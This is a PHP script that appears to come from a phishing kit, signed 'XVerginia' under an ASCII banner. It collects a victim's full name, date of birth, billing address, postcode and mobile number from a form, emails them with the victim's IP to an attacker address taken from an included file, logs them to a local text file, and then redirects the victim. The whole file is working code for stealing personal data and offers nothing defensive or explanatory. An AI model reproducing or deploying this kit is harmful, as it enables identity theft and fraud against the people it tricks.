<?php
######################################################################################################
######################################################################################################
######################################################################################################
######################################################################################################
#                                                                                                    #
#   ########  ##    ##  ########  ##        ########  ########  ########   ###       ###      ####   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##  ##    ##     ###   ###       ## ##   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##  ##    ##      ##   ##       ##  ##   #
#   ##        ########  ########  ##        ########  ##    ##  ########       ## ##            ##   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##        ##        ###             ##   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##        ##         #              ##   #
#   ########  ##    ##  ########  ########  ########  ########        ##         #            ###### #
#                              \\ FB:https://www.facebook.com/chlboo9 //                             #
######################################################################################################
######################################################################################################
######################################################################################################
######################################################################################################
////////


session_start();
$ip = getenv("REMOTE_ADDR");



$_SESSION['name'] = $_POST['name'];
$_SESSION['day'] = $_POST['day'];
$_SESSION['month'] = $_POST['month'];
$_SESSION['year'] = $_POST['year'];
$_SESSION['billing'] = $_POST['billing'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['country'] = $_POST['country'];
$_SESSION['postcode'] = $_POST['postcode'];
$_SESSION['mobile'] = $_POST['mobile'];

$headers = "From: XVerginia <zebi@lbox.com>\r\n" ;
$msg =
"------------NEW BILLING--------------------->
Full Name : ".$_SESSION['name']."
Date of Birth : ".$_SESSION['day']." ".$_SESSION['month']." ".$_SESSION['year']."
Billing Address : ".$_SESSION['billing']."
City : ".$_SESSION['city']."
Country : ".$_SESSION['country']."
Postcode : ".$_SESSION['postcode']."
Mobile Number : ".$_SESSION['mobile']."
+=+=+=+=+=+=+=+=+=## XVerginia ##+=+=+=+=+=+=+=+=+=+=+=+=";

include 'email.php';
$subj = "♥ Billing Info ♥ - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
$file = fopen("root-mrx.txt", 'a');
fwrite($file, $msg);
include 'hostname_check.php';
header("Location: complete.php?ip=$ip");
?>